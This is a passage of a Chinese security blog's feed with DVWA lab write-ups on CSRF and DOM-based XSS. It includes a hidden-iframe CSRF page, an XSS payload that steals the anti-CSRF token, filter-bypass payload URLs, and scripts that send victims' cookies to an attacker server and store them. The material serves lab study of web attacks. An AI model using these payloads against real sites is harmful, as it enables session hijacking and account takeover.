        &lt;h1 id=&quot;dvwa-sql注入&quot;&gt;&lt;a href=&quot;#dvwa-sql注入&quot; class=&quot;headerlink&quot; title=&quot;dvwa sql注入&quot;&gt;&lt;/a&gt;dvwa sql注入&lt;/h1&gt;&lt;h3 id=&quot;sql注入&quot;&gt;&lt;a href=&quot;#sql注入&quot; class=&quot;he
      
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="dvwa学习" scheme="http://yoursite.com/tags/dvwa%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>dvwa CSRF</title>
    <link href="http://yoursite.com/2017/12/22/DVWA%20CSRF/"/>
    <id>http://yoursite.com/2017/12/22/DVWA CSRF/</id>
    <published>2017-12-22T15:52:04.363Z</published>
    <updated>2017-12-23T12:32:05.394Z</updated>
    
    <content type="html"><![CDATA[<h1 id="dvwa-CSRF"><a href="#dvwa-CSRF" class="headerlink" title="dvwa CSRF"></a>dvwa CSRF</h1><h3 id="何为csrf"><a href="#何为csrf" class="headerlink" title="何为csrf"></a>何为csrf</h3><p><strong>csrf的全称为跨站请求伪造，都有着跨站两字，但和之前的xss(跨站脚本攻击)不同的是csrf是利用目标网站用户的身份去做一些事情，相当于借刀杀人，突出在伪造两字，下面通过dvwa来研究一下csrf，使用csrf修改网站用户密码</strong></p><h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><p><strong>一台win2003虚拟机，ip为192.168.50.128，用wamp集成环境将dvwa搭在8080端口</strong><br><strong>一台win7虚拟机，ip为192.168.50.155,攻击者的服务器，web由phpstudy搭建</strong><br><strong>默认登陆用户名密码为admin,password，我们用csrf漏洞去修改密码</strong></p><h3 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别</h3><p><strong>low级别代码</strong><br>    &lt;?php</p><pre><code>if( isset( $_GET[ &apos;Change&apos; ] ) ) {    // Get input    $pass_new  = $_GET[ &apos;password_new&apos; ];    $pass_conf = $_GET[ &apos;password_conf&apos; ];    // Do the passwords match?    if( $pass_new == $pass_conf ) {    // They do!        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));        $pass_new = md5( $pass_new );        // Update the database        $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;;        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );        // Feedback for the user        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;    }    else {        // Issue with passwords matching        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;    }    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);}?&gt;</code></pre><p><strong>该代码接收网站用户传来的新密码判断是否一致，一致的话就更新数据库的网站该用户的密码</strong><br><strong>再看页面</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171223/hijFlc0kkk.PNG" alt="mark"><br><strong>dvwa为我们展示的是一个正常修改密码的页面，用户通过表单填写新密码即可修改密码</strong><br><strong>用burp抓包看看用户填写新密码到点击提交的过程中发生了什么</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171223/KJ2J2HGDeh.PNG" alt="mark"><br><strong>可以看出用户提交从填写密码到提交到服务器实际上是向服务器发送了一个http数据包</strong></p><pre><code>GET /DVWA-master/vulnerabilities/csrf/?password_new=hacker&amp;password_conf=hacker&amp;Change=Change HTTP/1.1Host: 192.168.50.128:8080User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://192.168.50.128:8080/DVWA-master/vulnerabilities/csrf/Cookie: security=low; PHPSESSID=a6bnfv0lnvsho8sq9v3ofqg6r7Connection: keep-aliveUpgrade-Insecure-Requests: 1</code></pre><p><strong>简单的来说，服务器接收到这个http数据包就会做出响应修改密码</strong><br><strong>现在来思考一下，如果我们诱使用户去点击我们构造的链接</strong></p><pre><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/csrf/?password_new=hacker&amp;password_conf=hacker&amp;Change=Change</code></pre><p><strong>受害用户点击后，也发出一样的http请求，将用户的密码改为<code>hacker</code></strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171223/D0gA6KCbiJ.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171223/A9G4Ib0lcK.PNG" alt="mark"><br><strong>服务器接受到请求便会修改密码，这种攻击手段可以看作是借受害用户的身份（cookie）去做用户做的事情，通过简单的csrf可以看出csrf相对xss，仅仅利用用户的身份便可以做任何受害用户可以做的事情</strong><br><strong>可以看出只要我们诱使用户向服务器发出相应的http请求就可以达到修改密码的效果</strong><br><strong>上面诱使用户去点击我们构造的链接是一种方式</strong><br><strong>另一种方式是诱使用户去点击我们构造的具有吸引力的页面，并在页面中用src加载链接，就相当于向服务器发送了一次http请求</strong><br><strong>来看一个页面</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171223/H2HJ4bgFlK.PNG" alt="mark"></p><pre><code>http://192.168.50.155/dvwacsrf/mengmeizi.html</code></pre><p><strong>这是黑客服务器上的一个页面，只要诱惑受害人访问就能产生跨站请求伪造，页面中有一个很萌的二次元妹子图片，看起来并没有什么问题</strong><br><strong>但是查看一下页面源代码</strong></p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;    &lt;title&gt;动漫萌妹子&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;div id=&quot;meizi1&quot;&gt;        &lt;img src=&quot;images/timg.jpg&quot;&gt;        &lt;iframe src=&quot;http://192.168.50.128:8080/DVWA-master/vulnerabilities/csrf/?password_new=hacker&amp;password_conf=hacker&amp;Change=Change&quot; style=&quot;display:none&quot;&gt;    &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><strong>发现用iframe标签的src属性加载一个链接</strong></p><pre><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/csrf/?password_new=hacker&amp;password_conf=hacker&amp;Change=Change</code></pre><p><strong>并且将style属性的值设为<code>display:none</code>，将iframe框架中的内容隐藏起来</strong><br><strong>src加载了链接就相当于向该链接中的服务器发送了一次修改密码的http请求，这一点可以通过浏览器插件firebug抓包就可以发现</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171223/e5HEhfa9fa.PNG" alt="mark"><br><strong>所以只要黑客诱使受害者访问该页面就会发送相应的http请求给存在csrf漏洞的网站服务器，修改受害用户的密码</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171223/A9G4Ib0lcK.PNG" alt="mark"></p><h3 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h3><p><strong>代码如下</strong></p><pre><code>&lt;?phpif( isset( $_GET[ &apos;Change&apos; ] ) ) {    // Checks to see where the request came from    if( stripos( $_SERVER[ &apos;HTTP_REFERER&apos; ] ,$_SERVER[ &apos;SERVER_NAME&apos; ]) !== false ) {        // Get input        $pass_new  = $_GET[ &apos;password_new&apos; ];        $pass_conf = $_GET[ &apos;password_conf&apos; ];        // Do the passwords match?        if( $pass_new == $pass_conf ) {            // They do!            $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));            $pass_new = md5( $pass_new );            // Update the database            $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;;            $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );            // Feedback for the user            echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;        }        else {            // Issue with passwords matching            echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;        }    }    else {        // Didn&apos;t come from a trusted source        echo &quot;&lt;pre&gt;That request didn&apos;t look correct.&lt;/pre&gt;&quot;;    }    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);}?&gt;</code></pre><p><strong>可看到多了一些防御手段，要求修改密码的http数据包的Referer字段中必须有Host的名字，也就是要求修改密码的这个http请求必须是从修改密码的页面发出的才可以，来简单分析一下，如果是当前网站的用户要修改密码，他就必然要访问该网站修改密码的页面，所以点击提交按钮后http的请求中的Referer字段中必然会有该网站的主机名，但是如果是用户直接点击了修改密码的链接，或者访问了黑客服务器的页面，那么http数据包里的Referer值中就不会有该网站的主机，对比一下http数据包的Referer值即可明白</strong><br><strong>如果是用户自己修改的密码，那么Referer值为</strong></p><pre><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/csrf/</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/171223/KJ2J2HGDeh.PNG" alt="mark"><br><strong>如果用户是在不知情的情况下向服务器发送了修改密码的http请求，那么Referer值就不会有网站的Host值</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171223/D0gA6KCbiJ.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171223/e5HEhfa9fa.PNG" alt="mark"><br><strong>看似这种防御已经没什么问题了，但是如果我们将黑客服务器上的页面的文件名改为192.168.50.128:8080.html的话，就可以绕过，但是windows的文件名不能有<code>:</code>这个字符，所以没有尝试成功，不过这样绕过是肯定可以的</strong></p><h3 id="high级别"><a href="#high级别" class="headerlink" title="high级别"></a>high级别</h3><p><strong>代码如下</strong><br>    &lt;?php</p><pre><code>if( isset( $_GET[ &apos;Change&apos; ] ) ) {    // Check Anti-CSRF token    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );    // Get input    $pass_new  = $_GET[ &apos;password_new&apos; ];    $pass_conf = $_GET[ &apos;password_conf&apos; ];    // Do the passwords match?    if( $pass_new == $pass_conf ) {        // They do!        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));        $pass_new = md5( $pass_new );        // Update the database        $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;;        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );        // Feedback for the user        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;    }    else {        // Issue with passwords matching        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;    }    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);}// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</code></pre><p><strong>可以看出这次使用的是token防御，在修改密码的页面的表单中带上一个token，当用户修改密码后点击提交后发送的http请求中会带上页面的token值</strong></p><pre><code>GET /DVWA-master/vulnerabilities/csrf/?password_new=hacker&amp;password_conf=hacker&amp;Change=Change&amp;user_token=78f083605aa7d8cfb698eb414ffa7064 HTTP/1.1Host: 192.168.50.128:8080User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://192.168.50.128:8080/DVWA-master/vulnerabilities/csrf/Cookie: security=high; PHPSESSID=a6bnfv0lnvsho8sq9v3ofqg6r7Connection: keep-aliveUpgrade-Insecure-Requests: 1</code></pre><p><strong>这个token值是随机生成的，也是攻击者所猜不到的，所以完全的做到了防御csrf</strong></p><p><img src="http://p008biu9n.bkt.clouddn.com/blog/171223/b1EChEKHci.PNG" alt="mark"><br><strong>但是高危级别的dvwa有着xss漏洞，我们可以利用存储型xss来完成这次csrf攻击</strong><br><strong>在存储型xss的地方提交</strong></p><pre><code>Name：&lt;iframe src=&quot;../csrf&quot; style=&quot;display:none&quot; onload=&quot;var a= documen&amp;#x74;.crea&amp;#x74;eElemen&amp;#x74;(&apos;scrip&amp;#x74;&apos;);a.se&amp;#x74;A&amp;#x74;&amp;#x74;ribu&amp;#x74;e(&apos;src&apos;,&apos;h&amp;#x74;&amp;#x74;p://192.168.50.155/dvwacsrf/changepw.js&apos;);documen&amp;#x74;.ge&amp;#x74;Elemen&amp;#x74;sBy&amp;#x54;agName(&apos;head&apos;)[0].appendChild(a);&quot;&gt;Message：use csrf by xss</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/171223/iceIl38iCE.PNG" alt="mark"><br><strong>使用iframe将存在csrf的页面加载到存在xss的页面</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171223/bKaGdJ3m7I.PNG" alt="mark"><br><strong>利用iframe标签的onload事件进行javascript dom操作创建<code>script</code>标签加载远程脚本<code>http://192.168.50.155/dvwacsrf/changepw.js</code>，这种方法在之前的xss文章中写到过</strong><br><strong>changepw.js代码如下</strong></p><pre><code>var token=frames[0].document.getElementsByName(&quot;user_token&quot;)[0].value;var url = &quot;http://192.168.50.128:8080/DVWA-master/vulnerabilities/csrf/?password_new=hacker&amp;password_conf=hacker&amp;Change=Change&amp;user_token=&quot;+token;var ajax = null;if (window.XMLHttpRequest) {    ajax = new XMLHttpRequest();} else if (window.ActiveXObject) {    ajax = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);} else {    ajax=null;}ajax.open(&quot;GET&quot;, url, true);ajax.send(null);</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/171223/2hHm9ABIbf.PNG" alt="mark"><br><strong>这段js代码将获取iframe标签中src加载的存在csrf页面的表单隐藏域中的token，然后通过ajax向服务器发送修改密码的http请求并带上token，通过存储型xss可以成功的利用的本不可能产生的csrf漏洞修改用户密码</strong><br><strong>用firebug抓包可以观察到利用xss漏洞将会获取存在csrf页面的token并将token附带到修改密码的http请求中发送到服务器</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171223/bd1bcA49C3.PNG" alt="mark"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><strong>从对dvwa中csrf的研究可以看出csrf最有效的防御方式还是利用token来进行防御</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;dvwa-CSRF&quot;&gt;&lt;a href=&quot;#dvwa-CSRF&quot; class=&quot;headerlink&quot; title=&quot;dvwa CSRF&quot;&gt;&lt;/a&gt;dvwa CSRF&lt;/h1&gt;&lt;h3 id=&quot;何为csrf&quot;&gt;&lt;a href=&quot;#何为csrf&quot; class=&quot;head
      
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="dvwa学习" scheme="http://yoursite.com/tags/dvwa%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>dvwa XSS(DOM)</title>
    <link href="http://yoursite.com/2017/12/21/DOM%20XSS/"/>
    <id>http://yoursite.com/2017/12/21/DOM XSS/</id>
    <published>2017-12-21T11:21:07.805Z</published>
    <updated>2017-12-22T15:29:17.297Z</updated>
    
    <content type="html"><![CDATA[<h1 id="dvwa-DOM型XSS"><a href="#dvwa-DOM型XSS" class="headerlink" title="dvwa DOM型XSS"></a>dvwa DOM型XSS</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>因为英语六级考试，忙着备考，博客好久没更新了，这次考完后感觉考的不是太理想，英语的四六级考试感觉出的题越来越奇怪，看微信一个很有名的英语老师公众号一篇文章说的今年出的考题的文章都选自国外一些不出名的小网站而且是十几年前的文章，只是为了防止被压中题吗？从之前的四六级证书变为一张成绩单，从原来的大学毕业要求标准变为不再要求，是什么让一个英语水平考试变成现在这样，这也是我这几天感到很迷茫的一件事，不过迷茫归迷茫，总有一些事情需要去坚持，比如写博客，将自己所学的东西沉淀下来，形成一种无形的财富</strong></p><h3 id="dom-xss"><a href="#dom-xss" class="headerlink" title="dom xss"></a>dom xss</h3><p><strong>xss主要分为三种，前面通过了dvwa分别研究了反射型和存储型两种xss，这次写篇有关dom xss的文章，dom xss和前面的两种xss的区别主要是：dom xss的产生并没有和后台服务器产生交互，而是通过浏览器的dom树解析产生的，下面来学习一下这种xss</strong></p><h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><p><strong>一台win2003虚拟机，ip为192.168.50.128，用wamp集成环境将dvwa搭在8080端口</strong><br><strong>一台win7虚拟机，ip为192.168.50.156,用来接受漏洞网站的cookie，web由phpstudy搭建</strong></p><h3 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别</h3><p><strong>服务器端没有任何php代码，查看前端页面源代码，处理用户输入的只有前端的js代码：</strong></p><pre><code>&lt;script&gt;    if (document.location.href.indexOf(&quot;default=&quot;) &gt;= 0) {    var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8);    document.write(&quot;&lt;option value=&apos;&quot; + lang + &quot;&apos;&gt;&quot; + decodeURI(lang) + &quot;&lt;/option&gt;&quot;);    document.write(&quot;&lt;option value=&apos;&apos; disabled=&apos;disabled&apos;&gt;----&lt;/option&gt;&quot;);    }    document.write(&quot;&lt;option value=&apos;English&apos;&gt;English&lt;/option&gt;&quot;);    document.write(&quot;&lt;option value=&apos;French&apos;&gt;French&lt;/option&gt;&quot;);    document.write(&quot;&lt;option value=&apos;Spanish&apos;&gt;Spanish&lt;/option&gt;&quot;);    document.write(&quot;&lt;option value=&apos;German&apos;&gt;German&lt;/option&gt;&quot;);&lt;/script&gt;</code></pre><p><strong>我们从选择列表选择的值赋值给default附加到url后，这段js代码将url中default的值赋给option标签的value属性节点和文本节点</strong><br><strong>构造payload:<code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/xss_d/?default=%3Cscript%3Ealert(%22xss%22)%3C/script%3E</code>,弹框证明有xss的存在，浏览器在解析html dom树时就会触发js弹框代码</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171221/mfllfKgda8.PNG" alt="mark"><br><strong>接下来利用dom xss获取网站的cookie，构造连接</strong><br><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/xss_d/?default=%3Cscript%20src=http://192.168.50.156/dvwaxss/cookie.js%3E%3C/script%3E</code><br><strong>用script标签加载远程服务器上我们编写的获取网站用户cookie的js代码,和之前的一样利用ajax</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171221/L6LJae1A9c.PNG" alt="mark"></p><pre><code>var url = &quot;http://192.168.50.156/dvwaxss/steal.php&quot;;var postStr = &quot;data=&quot;+document.cookie;var ajax = null;if (window.XMLHttpRequest) {    ajax = new XMLHttpRequest();} else if (window.ActiveXObject) {    ajax = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);} else {    ajax=null;}ajax.open(&quot;POST&quot;, url, true);//true代表异步ajax.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);ajax.send(postStr);</code></pre><p><strong>上面编写的代码创建了一个ajax对象，构造了一个post请求将用户的cookie作为参数发送到了<code>http://192.168.50.156/dvwaxss/steal.php</code>,也就是当前目录下的steal.php</strong></p><pre><code>&lt;?phpheader(&quot;content-type:text/html;charset=utf-8&quot;);$conn=mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);mysql_select_db(&quot;dvwacookie&quot;,$conn);if(isset($_GET[&apos;data&apos;])){    $sql=&quot;insert into low(cookie) values(&apos;&quot;.$_GET[&apos;data&apos;].&quot;&apos;);&quot;;    $result=mysql_query($sql,$conn);    mysql_close();}else if(isset($_POST[&apos;data&apos;])){    $sql=&quot;insert into low(cookie) values(&apos;&quot;.$_POST[&apos;data&apos;].&quot;&apos;);&quot;;    $result=mysql_query($sql,$conn);    mysql_close();}else{    $sql=&quot;select * from low&quot;;    $result=mysql_query($sql,$conn);    while($row=mysql_fetch_array($result))    {        echo &quot;偷取的cookie:&quot;.$row[1].&quot;&lt;/br&gt;&quot;;    }    mysql_close();}?&gt;</code></pre><p><strong>steal.php将我们获取到的cookie存到数据库中</strong><br><strong>可以看到数据库已经接收到了网站用户的cookie</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171221/1A2FLkFFC5.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171221/Bhc2GIJc0G.PNG" alt="mark"><br><strong>同样的还可以使用juery ajax，构造连接</strong></p><pre><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/xss_d/?default=%3Cscript%20src=%22http://cdn.static.runoob.com/libs/jquery/1.10.2/jquery.min.js%22%3E%3C/script%3E%3Cscript%20src=http://192.168.50.156/dvwaxss/cookie.js%3E%3C/script%3E</code></pre><p><strong>代码如下</strong></p><pre><code>$(document).ready(function(){$.post(&quot;http://192.168.50.156/dvwaxss/steal.php&quot;,{data:document.cookie});});</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/171221/81H48IdjA6.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171221/94aE46h16I.PNG" alt="mark"><br><strong>同样接收到了cookie</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171221/A1Kgg6jHIE.PNG" alt="mark"></p><h3 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h3><p><strong>前端代码如下，和low级别的一样</strong></p><pre><code>&lt;script&gt;    if (document.location.href.indexOf(&quot;default=&quot;) &gt;= 0) {    var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8);    document.write(&quot;&lt;option value=&apos;&quot; + lang + &quot;&apos;&gt;&quot; + decodeURI(lang) + &quot;&lt;/option&gt;&quot;);    document.write(&quot;&lt;option value=&apos;&apos; disabled=&apos;disabled&apos;&gt;----&lt;/option&gt;&quot;);    }    document.write(&quot;&lt;option value=&apos;English&apos;&gt;English&lt;/option&gt;&quot;);    document.write(&quot;&lt;option value=&apos;French&apos;&gt;French&lt;/option&gt;&quot;);    document.write(&quot;&lt;option value=&apos;Spanish&apos;&gt;Spanish&lt;/option&gt;&quot;);    document.write(&quot;&lt;option value=&apos;German&apos;&gt;German&lt;/option&gt;&quot;);&lt;/script&gt;</code></pre><p><strong>但是后端代码对url的default参数的值做了限制</strong></p><pre><code>&lt;?php// Is there any input?if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) {    $default = $_GET[&apos;default&apos;];    # Do not allow script tags    if (stripos ($default, &quot;&lt;script&quot;) !== false) {        header (&quot;location: ?default=English&quot;);        exit;    }}?&gt; </code></pre><p><strong>不允许出现<code>script</code>标签，否则就将default的值设为默认的English，stripos还防止了大小写绕过</strong><br><strong>这里的绕过有两种方式</strong><br><strong>方式1</strong><br><strong>url中有一个字符为<code>#</code>，该字符后的数据不会发送到服务器端，从而绕过服务端过滤，构造连接为</strong></p><pre><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/xss_d/?#default=%3Cscript%3Ealert(%22xss%22)%3C/script%3E</code></pre><p><strong>可以看出成功绕过</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171221/13Fk7fBGA9.png?imageslim" alt="mark"><br><strong>方法2</strong><br><strong>或者就是用img标签或其他标签的特性去执行js代码，比如img标签的onerror事件，构造连接</strong></p><pre><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/xss_d/?default=%3C/option%3E%3C/select%3E%3Cimg%20src=#%20onerror=alert(%22xss%22)%3E</code></pre><p><strong>注意这里要闭合option以及select标签，这样做会破坏页面结构，隐蔽性不如第一种方法，同样的标签还有svg等，比如</strong></p><pre><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/xss_d/?default=%3C/option%3E%3C/select%3E%3Csvg%20onload=alert(&quot;xss&quot;)%3E</code></pre><p><strong>svg的onload事件同样可以在页面加载时执行js代码，产生弹框的效果，同样的标签还有好多</strong><br><strong>下面我们用这些方法加载远程js脚本获取网站用户的cookie(发送cookie的代码用juery)</strong></p><pre><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/xss_d/#?default=%3Cscript%20src=%22http://cdn.static.runoob.com/libs/jquery/1.10.2/jquery.min.js%22%3E%3C/script%3E%3Cscript%20src=http://192.168.50.156/dvwaxss/cookie.js%3E%3C/script%3E</code></pre><p><strong>img标签onerror事件加载</strong>    </p><pre><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/xss_d/?default=%3C/option%3E%3C/select%3E%3Cimg%20src=#%20onerror=%22var%20b=%20document.createElement(%27script%27);%20b.setAttribute(%27src%27,%27http://192.168.50.156/dvwaxss/cookie.js%27);document.getElementsByTagName(%27head%27)[0].appendChild(b);%22%3E</code></pre><p><strong>onerror事件后执行js代码，通过js的dom操作创建<code>script</code>标签加载远程脚本，下面是onerror事件后执行的js代码，和上一节的一样</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171221/j3jd0f1IlF.PNG" alt="mark"></p><pre><code>var b= document.createElement(&apos;script&apos;); b.setAttribute(&apos;src&apos;,&apos;http://192.168.50.156/dvwaxss/cookie.js&apos;);document.getElementsByTagName(&apos;head&apos;)[0].appendChild(b);</code></pre><p><strong>远程获取cookie脚本</strong></p><pre><code>var url = &quot;http://192.168.50.156/dvwaxss/steal.php&quot;;var postStr = &quot;data=&quot;+document.cookie;var ajax = null;if (window.XMLHttpRequest) {    ajax = new XMLHttpRequest();} else if (window.ActiveXObject) {    ajax = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);} else {    ajax=null;}ajax.open(&quot;POST&quot;, url, true);ajax.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);ajax.send(postStr);</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/171221/6Ejh1AgkL8.PNG" alt="mark"><br><strong>同样svg标签的onload也可以，构造连接</strong></p><pre><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/xss_d/?default=%3C/option%3E%3C/select%3E%3Csvg%20onload=%22var%20b=%20document.createElement(%27script%27);%20b.setAttribute(%27src%27,%27http://192.168.50.156/dvwaxss/cookie.js%27);document.getElementsByTagName(%27head%27)[0].appendChild(b);%22%3E</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/171221/H9Akichlm2.PNG" alt="mark"></p><p><strong>以上方法均可以绕过medium加载远程脚本获取网站用户cookie</strong></p><p>###high级别###</p><pre><code>&lt;?php// Is there any input?if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) {    # White list the allowable languages    switch ($_GET[&apos;default&apos;]) {        case &quot;French&quot;:        case &quot;English&quot;:        case &quot;German&quot;:        case &quot;Spanish&quot;:            # ok            break;        default:            header (&quot;location: ?default=English&quot;);            exit;    }}?&gt;</code></pre><p><strong>在服务器后端判断，要求default的值必须为select选择菜单中的值，这里继续用上面的<code>#</code>符号绕过即可，构造payload</strong></p><pre><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/xss_d/?default=English#%3Cscript%20src=%22http://cdn.static.runoob.com/libs/jquery/1.10.2/jquery.min.js%22%3E%3C/script%3E%3Cscript%20src=http://192.168.50.156/dvwaxss/cookie.js%3E%3C/script%3E</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/171221/dlmDi8mki4.PNG" alt="mark"><br><strong>加载远程脚本</strong></p><pre><code>$(document).ready(function(){$.post(&quot;http://192.168.50.156/dvwaxss/steal.php&quot;,{data:document.cookie});});</code></pre><p><strong>获取high级别的网站用户cookie</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171221/KajidE273e.PNG" 